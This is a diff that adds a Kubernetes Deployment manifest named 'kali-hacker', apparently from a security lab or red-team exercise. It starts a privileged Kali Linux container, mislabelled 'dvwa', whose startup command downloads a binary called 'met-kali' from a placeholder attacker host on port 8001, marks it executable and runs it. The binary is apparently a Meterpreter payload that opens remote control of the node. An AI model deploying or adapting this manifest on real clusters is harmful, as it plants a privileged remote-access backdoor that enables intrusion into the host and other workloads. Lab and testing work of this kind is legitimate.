@@ -1,0 +1,24 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: kali-hacker
+  namespace: default
+spec:
+  selector:
+    matchLabels:
+      app: kali-hacker
+  template:
+    metadata:
+      labels:
+        app: kali-hacker
+    spec:
+      containers:
+        - name: dvwa
+          image: docker.io/kalilinux/kali-rolling
+          command: ["/bin/bash","-c","/usr/bin/apt update -y && /usr/bin/apt install -y curl && /usr/bin/curl -vk http://<kali-public-vm-ip>:8001/met-kali -o /tmp/met && /usr/bin/chmod 777 /tmp/met && /tmp/met"]
+          imagePullPolicy: IfNotPresent
+          ports:
+            - containerPort: 80
+          securityContext:
+            privileged: true
+      terminationGracePeriodSeconds: 30
